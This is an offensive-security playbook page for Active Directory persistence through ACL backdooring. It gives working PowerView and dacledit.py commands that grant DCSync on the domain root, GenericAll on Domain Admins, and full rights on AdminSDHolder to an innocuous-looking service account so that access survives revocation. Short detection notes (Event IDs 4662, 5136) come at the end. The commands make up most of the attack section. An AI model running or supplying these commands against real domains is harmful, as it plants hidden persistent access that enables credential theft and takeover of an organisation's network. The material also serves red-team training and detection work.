---
title: "Attack #65 — ACL Backdooring (Persistence via DCSync ACE)"
description: "An attacker with DA can add hidden ACEs to domain objects to maintain persistent access. The most common pattern: grant a seemingly innocuous user DCSync…"
category: active-directory
subcategory: "Persistence"
tags: ["active-directory", "adcs", "credential-access", "persistence"]
tools: ["PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Eight/🟤 Attack #65 — ACL Backdooring (Persistence via DCSync ACE).md"
---
# 🟤 Attack #65 — ACL Backdooring (Persistence via DCSync ACE)

***

## 📖 How It Works

An attacker with DA can **add hidden ACEs** to domain objects to maintain persistent access. The most common pattern: grant a seemingly innocuous user DCSync rights on the domain root, or add GenericAll on the DA group, or backdoor AdminSDHolder (#26). Even after the DA account is revoked, the backdoor ACE allows re-escalation.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain Admin** | To modify ACLs on domain objects |

***

## 💻 Full Commands

```powershell
# ── Grant DCSync to a low-priv user (persistence) ────────────────────────────
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity svc_monitoring -Rights DCSync -Verbose
# svc_monitoring now has permanent DCSync — looks like a service account

# ── Grant GenericAll on DA group ──────────────────────────────────────────────
Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
  -PrincipalIdentity svc_monitoring -Rights All

# ── BackdoorAdminSDHolder (Attack #26 — self-healing) ────────────────────────
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity svc_monitoring -Rights All

# ── Verify ────────────────────────────────────────────────────────────────────
Get-ObjectAcl "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
  $_.IdentityReference -match "svc_monitoring"
}
```

```bash
# ── Linux ─────────────────────────────────────────────────────────────────────
dacledit.py -action write -rights DCSync \
  -principal svc_monitoring -target-dn "DC=corp,DC=local" \
  corp.local/Administrator:'Password1' -dc-ip 10.10.10.10
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | DACL write on domain root |
| **5136** | Security Log (DC) | nTSecurityDescriptor modified |

***

## 🔗 Attack Chain Context

```
[ACL Backdooring] ──→ Persistent Privilege Re-Escalation via Hidden ACEs
         │
         ├──→ 🔗 DCSync ACE + AdminSDHolder = self-healing persistent access
         ├──→ 📋 Survives DA account revocation — the backdoor ACE remains
         └──→ 💀 Defeated by: regular ACL audits, baseline domain root DACL
```

***

> ✅ **Attack #65 — ACL Backdooring complete.**
